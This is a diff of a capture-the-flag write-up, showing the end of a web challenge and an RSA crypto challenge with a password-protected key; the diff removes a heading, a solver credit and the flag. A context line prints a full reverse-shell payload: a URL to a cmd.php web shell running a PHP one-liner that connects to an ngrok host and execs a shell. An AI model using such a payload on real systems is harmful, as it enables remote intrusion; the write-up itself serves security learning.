@@ -128,16 +128,12 @@ after that I just launched a reverse shell on my computer using a TCP connection
 Here the payload that I used to get the shell:<br>
 ```http://16.170.159.222/images/cmd.php?cmd=php+-r+'$sock%3dfsockopen("tcp://4.tcp.ngrok.io",16205)%3bexec("sh+<%263+>%263+2>%263")%3b'```
 
-#### Cryptography :
-  
-- What's going on (solved by opscur):
+- What's going on :
     
 ![](https://hackmd.io/_uploads/SkDg9H3z6.png)
 
 This is an RSA challenge, with a bit of guessing. we have an encoded file which contains the flag. The encoded file was provided with a private key to unlock the flag. The difficulty here is that the key is password protected. He made several attempts before coming across the password which was "password". We used cyberchief to decipher the flag as you see below.
     
 ![](https://hackmd.io/_uploads/SJH2YB3fT.png)
-
-Flag: acdfCTF{4ncrypt10n_1s_W14rd0}
 
 </details>
